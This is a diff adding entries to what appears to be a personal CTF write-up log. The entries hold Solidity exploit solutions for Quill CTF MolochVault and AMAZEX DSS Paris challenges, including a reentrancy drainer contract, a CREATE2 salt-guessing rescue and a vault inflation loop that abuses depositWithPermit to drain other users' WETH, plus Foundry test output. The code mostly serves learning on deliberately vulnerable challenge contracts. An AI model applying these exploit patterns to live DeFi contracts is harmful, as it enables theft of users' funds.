@@ -1174,4 +1174,180 @@ ref: https://github.com/Kaiziron/quill-ctf-writeup/blob/main/invest-pool.md
     }
 ```
 
+### 2024.09.16
+
+- Quill CTF: MolochVault
+
+```solidity
+        require(hsah == keccak256(abi.encode(_openSecrete[0])) && msg.value < 3 gwei, "success"); // molochPass
+        require(hy7UIH == keccak256(abi.encodePacked(_openSecrete[1],_openSecrete[2])), "Hahahaha!!"); // keccak256(abi.encodePacked(_b[0],_b[1]))
+        require(keccak256(abi.encode(_openSecrete[1])) != keccak256(abi.encode(question[0])),"grant awarded!!"); // split the _openSecrete[1],_openSecrete[2]
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+import "../src/moloch_vault.sol";
+
+
+contract Hack is Test {
+    MOLOCH_VAULT molochVault;
+    MolochVaultExploit molochVaultExploit;
+    uint256 startBalance;
+    address hacker = vm.addr(2);
+
+    function setUp() external {
+        molochVault = MOLOCH_VAULT(payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f));
+        startBalance = address(molochVault).balance;
+        console.log("Starting balance : ", startBalance);
+        
+        vm.prank(hacker);
+        molochVaultExploit = new MolochVaultExploit();
+        vm.deal(hacker, 1 ether);
+    }
+
+    function test() public {
+        vm.startPrank(hacker);
+        molochVaultExploit.exploit{value: 2 wei}(address(molochVault));
+        
+        console.log("Balance after exploit : ", address(molochVault).balance);
+        assertLt(address(molochVault).balance, startBalance);
+    }
+}
+
+
+pragma solidity ^0.8.7;
+
+contract MolochVaultExploit {
+    uint256 counter = 0;
+    
+    function exploit(address molochVault) public payable {
+        MOLOCH_VAULT(payable(molochVault)).uhER778(["BLOODY PHARMACIST", "WHO DO YOUS", "ERVE?"]);
+        // send grant will give us 1 wei
+        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
+        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
+    }
+    
+    receive() external payable {
+        if (counter == 0) {
+            counter += 1;
+            payable(msg.sender).transfer(2 wei);
+        }
+    }
+}
+```
+
+```bash
+forge test --match-path test/moloch.t.sol -vv --fork-url https://eth-goerli.public.blastapi.io
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/moloch.t.sol:Hack
+[PASS] test() (gas: 114266)
+Logs:
+  Starting balance :  9999999999999928
+  Balance after exploit :  9999999999999927
+
+```
+
+### 2024.09.16
+recap: https://github.com/QiLOL/AMAZEX-DSS-PARIS-Solve
+
+#### lending pool
+```solidity
+
+    function testExploit() public {
+        vm.startPrank(hacker);
+        /*//////////////////////////////////////////////////////////////
+        //                    Add your hack below!                    //
+        //                        Hack part #2                        //
+        // Please implement necessary changes also to LendingHack.sol //
+        // terminal command to run the specific test:                 //
+        // forge test --match-contract Challenge3Test -vvvv           //
+        //////////////////////////////////////////////////////////////*/
+
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));
+
+        //=============================================================//
+        vm.stopPrank();
+
+        assertEq(
+            lendExGovernor.getPoolName(address(lendingPool)),
+            "LendingPool hack",
+            "lendingPool contract address now gives a different name"
+        );
+        assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
+    }
+
+```
+
+#### RescuePosi
+```solidity
+    function testWhitehatRescue() public {
+        vm.deal(whitehat, 10 ether);
+        vm.startPrank(whitehat, whitehat);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge4Test -vvvv //
+        ////////////////////////////////////////////////////*/
+        // @note we know the guy birthday in Nov, maybe it's the salt for Create2, what a try : )
+        bytes memory bytecode = type(VaultWalletTemplate).creationCode;
+        VaultWalletTemplate vault = VaultWalletTemplate(payable(FACTORY.deploy(bytecode, 11)));
+        vault.initialize(whitehat);
+        vault.withdrawERC20(address(POSI), POSI.balanceOf(address(vault)), devs);
+        //==================================================//
+        vm.stopPrank();
+
+        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
+    }
+```
+
+#### BallonVault
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge5Test -vvvv //
+        ////////////////////////////////////////////////////*/
+        bytes32 na = "";
+
+
+        weth.approve(address(vault), type(uint256).max);
+        weth.deposit{value: 10 ether}();
+        
+        while(weth.balanceOf(address(attacker)) <= 1000 ether){
+            vault.deposit(1 wei, attacker); //@note WETH don't have the permit function
+            console.log(vault.totalSupply());
+            uint256 tmp = weth.balanceOf(address(attacker));
+
+            weth.transfer(address(vault), tmp); // assets.mulDiv(supply, totalAssets(), rounding) 
+        
+            uint256 max_tmp = tmp / 10**18 * 10**18;
+            uint256 max_drain = (max_tmp > weth.balanceOf(alice)) ? weth.balanceOf(alice) : max_tmp;
+            console2.log("max_drain: ", vault.previewDeposit(max_drain));
+            console2.log(max_drain, vault.totalSupply(), vault.totalAssets(), max_tmp);
+            vault.depositWithPermit(alice, max_drain, 0, 0, na, na);
+            vault.depositWithPermit(bob, max_drain, 0, 0, na, na);
+            console.log(vault.totalSupply());
+            vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker);
+            console.log(weth.balanceOf(address(attacker)));
+            
+        }
+
+
+        //==================================================//
+        vm.stopPrank();
+
+        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
+    }
+```
+
 <!-- Content_END -->
